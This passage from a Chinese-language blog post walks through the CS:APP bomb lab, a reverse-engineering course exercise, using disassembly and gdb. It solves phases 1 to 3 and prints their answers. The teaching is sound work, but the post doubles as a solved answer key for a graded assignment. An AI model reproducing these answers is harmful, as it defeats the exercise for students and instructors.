class="number">01</span> <span class="number">00</span> <span class="number">00</span>           callq  40100c &lt;phase_4&gt;</span><br><span class="line">  400e93:    e8 2c <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>           callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e98:    bf d8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4023d8,%edi</span><br><span class="line">  400e9d:    e8 6e fc ff ff           callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400ea2:    e8 f7 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">  400ea7:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400eaa:    e8 b3 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>           callq  <span class="number">401062</span> &lt;phase_5&gt;</span><br><span class="line">  400eaf:    e8 <span class="number">10</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>           callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400eb4:    bf 1a <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x40231a,%edi</span><br><span class="line">  400eb9:    e8 <span class="number">52</span> fc ff ff           callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400ebe:    e8 <span class="built_in">db</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">  400ec3:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">  400ec6:    e8 <span class="number">29</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           callq  4010f4 &lt;phase_6&gt;</span><br><span class="line">  400ecb:    e8 f4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>           callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400ed0:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400ed5:    5b                       <span class="keyword">pop</span>    %rbx</span><br><span class="line">  400ed6:    c3                       retq   </span><br><span class="line">  400ed7:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  400ed8:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  400ed9:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  400eda:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  400edb:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  400edc:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  400edd:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  400ede:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br><span class="line">  400edf:    <span class="number">90</span>                       <span class="keyword">nop</span></span><br></pre></td></tr></table></figure><h4 id="第一个短语"><a href="#第一个短语" class="headerlink" title="第一个短语"></a>第一个短语</h4><p>查看 bomb.c 第73行可知： readline 函数返回指向输入的第一个字符的指针。</p><p>查看 main 函数第36-38行。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400e32:    e8 <span class="number">67</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">400e3a:    e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           callq  400ee0 &lt;phase_1&gt;</span><br></pre></td></tr></table></figure><ul><li>1 调用 read_line 函数</li><li>2 read_line 函数返回结果存在 rax 寄存器， 将其移入 rdi 寄存器，作为之后函数的第一个参数。</li><li>3 调用 phase_1 函数。</li></ul><p>输入的字符指针作为第一个参数，一切都是那么的自然。根据38行指定的地址，查看 phase_1 函数汇编代码。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  400ee4:    be <span class="number">00</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x402400,%esi</span><br><span class="line">  400ee9:    e8 4a <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>           callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:    <span class="number">85</span> c0                    <span class="keyword">test</span>   %eax,%eax</span><br><span class="line">  400ef0:    <span class="number">74</span> <span class="number">05</span>                    <span class="keyword">je</span>     400ef7 &lt;phase_1+<span class="number">0x17</span>&gt;</span><br><span class="line">  400ef2:    e8 <span class="number">43</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>              <span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  400efb:    c3                       retq</span><br></pre></td></tr></table></figure><p>查看2-3行。</p><ul><li>2 内存地址 0x402400 移入 esi寄存器</li><li>3 调用 strings_not_equal 函数，此时 rdi 为 input</li></ul><p>从 strings_not_equal 函数名称和它所对应的两个参数可以知道:<br>input 应该和对应内存位置字符串相等。</p><p>我们使用 gdb 查看对应内存位置字符串:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) gdb bomb</span><br><span class="line">GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">&quot;show copying&quot;</span> and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from bomb...</span><br><span class="line">(gdb) p (char*)0x402400</span><br><span class="line"><span class="variable">$1</span> = 0x402400 <span class="string">&quot;Border relations with Canada have never been better.&quot;</span></span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>尝试运行 bomb 程序输入对应字符串试试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是的，我们成功了！</p><p>第四行之后的汇编代码主要是：如果函数返回0,成功返回。不是0,调用 explode_bomb 函数，代表着我们的输入失败了。</p><h4 id="第二个短语"><a href="#第二个短语" class="headerlink" title="第二个短语"></a>第二个短语</h4><p>查看 main 函数第 42-44 行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400e4e:    e8 4b 06 00 00           callq  40149e &lt;read_line&gt;</span><br><span class="line">400e53:    48 89 c7                 mov    %rax,%rdi</span><br><span class="line">400e56:    e8 a1 00 00 00           callq  400efc &lt;phase_2&gt;</span><br></pre></td></tr></table></figure><p>和第一个方式相同，不再赘述。</p><p>查看对应位置 phase_2 汇编代码。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:    <span class="number">55</span>                       <span class="keyword">push</span>   %rbp</span><br><span class="line">  400efd:    <span class="number">53</span>                       <span class="keyword">push</span>   %rbx</span><br><span class="line">  400efe:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  400f02:    <span class="number">48</span> <span class="number">89</span> e6                 <span class="keyword">mov</span>    %rsp,%rsi</span><br><span class="line">  400f05:    e8 <span class="number">52</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:    <span class="number">83</span> 3c <span class="number">24</span> <span class="number">01</span>              cmpl   <span class="number">$0</span>x1,(%rsp)</span><br><span class="line">  400f0e:    <span class="number">74</span> <span class="number">20</span>                    <span class="keyword">je</span>     400f30 &lt;phase_2+<span class="number">0x34</span>&gt;</span><br><span class="line">  400f10:    e8 <span class="number">25</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:    eb <span class="number">19</span>                    <span class="keyword">jmp</span>    400f30 &lt;phase_2+<span class="number">0x34</span>&gt;</span><br><span class="line">  400f17:    8b <span class="number">43</span> fc                 <span class="keyword">mov</span>    -<span class="number">0x4</span>(%rbx),%eax</span><br><span class="line">  400f1a:    <span class="number">01</span> c0                    <span class="keyword">add</span>    %eax,%eax</span><br><span class="line">  400f1c:    <span class="number">39</span> <span class="number">03</span>                    <span class="keyword">cmp</span>    %eax,(%rbx)</span><br><span class="line">  400f1e:    <span class="number">74</span> <span class="number">05</span>                    <span class="keyword">je</span>     400f25 &lt;phase_2+<span class="number">0x29</span>&gt;</span><br><span class="line">  400f20:    e8 <span class="number">15</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:    <span class="number">48</span> <span class="number">83</span> c3 <span class="number">04</span>              <span class="keyword">add</span>    <span class="number">$0</span>x4,%rbx</span><br><span class="line">  400f29:    <span class="number">48</span> <span class="number">39</span> eb                 <span class="keyword">cmp</span>    %rbp,%rbx</span><br><span class="line">  400f2c:    <span class="number">75</span> e9                    <span class="keyword">jne</span>    400f17 &lt;phase_2+<span class="number">0x1b</span>&gt;</span><br><span class="line">  400f2e:    eb 0c                    <span class="keyword">jmp</span>    400f3c &lt;phase_2+<span class="number">0x40</span>&gt;</span><br><span class="line">  400f30:    <span class="number">48</span> <span class="number">8d</span> 5c <span class="number">24</span> <span class="number">04</span>           <span class="keyword">lea</span>    <span class="number">0x4</span>(%rsp),%rbx</span><br><span class="line">  400f35:    <span class="number">48</span> <span class="number">8d</span> 6c <span class="number">24</span> <span class="number">18</span>           <span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rbp</span><br><span class="line">  400f3a:    eb <span class="built_in">db</span>                    <span class="keyword">jmp</span>    400f17 &lt;phase_2+<span class="number">0x1b</span>&gt;</span><br><span class="line">  400f3c:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>              <span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  400f40:    5b                       <span class="keyword">pop</span>    %rbx</span><br><span class="line">  400f41:    <span class="number">5d</span>                       <span class="keyword">pop</span>    %rbp</span><br><span class="line">  400f42:    c3                       retq </span><br></pre></td></tr></table></figure><ul><li>3-6： 将6个数字读到栈上。</li><li>7-9： 第一个数字不为1, 炸弹爆炸， 为1,跳到20行</li><li>10-26：检查每个数字是否为上个数字的2倍，不是则炸弹爆炸。</li></ul><p>所以答案应该是： 1 2 4 8 16 32</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="第三个短语"><a href="#第三个短语" class="headerlink" title="第三个短语"></a>第三个短语</h4><p>查看 main 函数48-50行。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400e6a:    e8 2f <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">400e6f:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">400e72:    e8 cc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           callq  400f43 &lt;phase_3&gt;</span><br></pre></td></tr></table></figure><p>查看对应位置的 phase_3 代码段:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  400f47:    <span class="number">48</span> <span class="number">8d</span> 4c <span class="number">24</span> 0c           <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  400f4c:    <span class="number">48</span> <span class="number">8d</span> <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>           <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  400f51:    be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi</span><br><span class="line">  400f56:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400f5b:    e8 <span class="number">90</span> fc ff ff           callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:    <span class="number">83</span> f8 <span class="number">01</span>                 <span class="keyword">cmp</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  400f63:    7f <span class="number">05</span>                    <span class="keyword">jg</span>     400f6a &lt;phase_3+<span class="number">0x27</span>&gt;</span><br><span class="line">  400f65:    e8 d0 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:    <span class="number">83</span> 7c <span class="number">24</span> <span class="number">08</span> <span class="number">07</span>           cmpl   <span class="number">$0</span>x7,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  400f6f:    <span class="number">77</span> 3c                    <span class="keyword">ja</span>     400fad &lt;phase_3+<span class="number">0x6a</span>&gt;</span><br><span class="line">  400f71:    8b <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>              <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%eax</span><br><span class="line">  400f75:    ff <span class="number">24</span> c5 <span class="number">70</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>     jmpq   *<span class="number">0x402470</span>(,%rax,<span class="number">8</span>)</span><br><span class="line">  400f7c:    b8 cf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>xcf,%eax</span><br><span class="line">  400f81:    eb 3b                    <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f83:    b8 c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x2c3,%eax</span><br><span class="line">  400f88:    eb <span class="number">34</span>                    <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f8a:    b8 <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x100,%eax</span><br><span class="line">  400f8f:    eb <span class="number">2d</span>                    <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f91:    b8 <span class="number">85</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x185,%eax</span><br><span class="line">  400f96:    eb <span class="number">26</span>                    <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f98:    b8 ce <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>xce,%eax</span><br><span class="line">  400f9d:    eb 1f                    <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f9f:    b8 aa <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x2aa,%eax</span><br><span class="line">  400fa4:    eb <span class="number">18</span>                    <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400fa6:    b8 <span class="number">47</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x147,%eax</span><br><span class="line">  400fab:    eb <span class="number">11</span>                    <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400fad:    e8 <span class="number">88</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400fb7:    eb <span class="number">05</span>                    <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400fb9:    b8 <span class="number">37</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x137,%eax</span><br><span class="line">  400fbe:    3b <span class="number">44</span> <span class="number">24</span> 0c              <span class="keyword">cmp</span>    <span class="number">0xc</span>(%rsp),%eax</span><br><span class="line">  400fc2:    <span class="number">74</span> <span class="number">05</span>                    <span class="keyword">je</span>     400fc9 &lt;phase_3+<span class="number">0x86</span>&gt;</span><br><span class="line">  400fc4:    e8 <span class="number">71</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>              <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  400fcd:    c3                       retq</span><br></pre></td></tr></table></figure><p>gdb 打印第5行内存内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) gdb bomb</span><br><span class="line">GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">&quot;show copying&quot;</span> and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from bomb...</span><br><span class="line">(gdb) p (char*)0x4025cf</span><br><span class="line"><span class="variable">$1</span> = 0x4025cf <span class="string">&quot;%d %d&quot;</span></span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><ul><li>7-10： 输入最少为两个整数</li><li>11-37: 第一个数 &lt;= 7， 第二个数由第一个数所计算出来的内存位置所决定</li></ul><p>由第14行可知：跳转地址为 0x402470 + (第一个数 * 8) 地址所对应的值</p><p>gdb 查看 0x402470 附近100个字节的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/100x 0x402470</span><br><span class="line">0x402470:    0x00400f7c    0x00000000    0x00400fb9    0x00000000</span><br><span class="line">0x402480:    0x00400f83    0x00000000    0x00400f8a    0x00000000</span><br><span class="line">0x402490:    0x00400f91    0x00000000    0x00400f98    0x00000000</span><br><span class="line">0x4024a0:    0x00400f9f    0x00000000    0x00400fa6    0x00000000</span><br><span class="line">0x4024b0 &lt;array.3449&gt;:    0x7564616d    0x73726569    0x746f666e    0x6c796276</span><br><span class="line">0x4024c0:    0x79206f53    0x7420756f    0x6b6e6968    0x756f7920</span><br><span class="line">0x4024d0:    0x6e616320    0x6f747320    0x68742070    0x6f622065</span><br><span class="line">0x4024e0:    0x7720626d    0x20687469    0x6c727463    0x202c632d</span><br><span class="line">0x4024f0:    0x79206f64    0x003f756f    0x73727543    0x202c7365</span><br><span class="line">0x402500:    0x27756f79    0x66206576    0x646e756f    0x65687420</span><br><span class="line">0x402510:    0x63657320    0x20746572    0x73616870    0x00002165</span><br><span class="line">0x402520:    0x20747542    0x646e6966    0x20676e69    0x61207469</span><br><span class="line">0x402530:    0x7320646e    0x69766c6f    0x6920676e    0x72612074</span><br><span class="line">0x402540:    0x75712065    0x20657469    0x66666964    0x6e657265</span><br><span class="line">0x402550:    0x2e2e2e74    0x00000000    0x676e6f43    0x75746172</span><br><span class="line">0x402560:    0x6974616c    0x21736e6f    0x756f5920    0x20657627</span><br><span class="line">0x402570:    0x75666564    0x20646573    0x20656874    0x626d6f62</span><br><span class="line">0x402580:    0x65570021    0x2e2e6c6c    0x4b4f002e    0x2d3a202e</span><br><span class="line">0x402590:    0x6e490029    0x696c6176    0x68702064    0x25657361</span><br><span class="line">0x4025a0:    0x0a000a73    0x4d4f4f42    0x00212121    0x20656854</span><br><span class="line">0x4025b0:    0x626d6f62    0x73616820    0x6f6c6220    0x75206e77</span><br><span class="line">0x4025c0:    0x25002e70    0x64252064    0x20642520    0x25206425</span><br><span class="line">0x4025d0:    0x64252064    0x72724500    0x203a726f    0x6d657250</span><br><span class="line">0x4025e0:    0x72757461    0x4f452065    0x6e6f2046    0x64747320</span><br><span class="line">0x4025f0:    0x47006e69    0x45444152    0x4d4f425f    0x72450042</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>可以得到两个数字的 8 个组合。<br>(0, 207) (1, 311) (2, 707) (3, 256) (4, 389) (5, 206) (6, 682) (7, 327)</p><p>输入这八个数字，都正确:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">0 207</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">1 311</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been 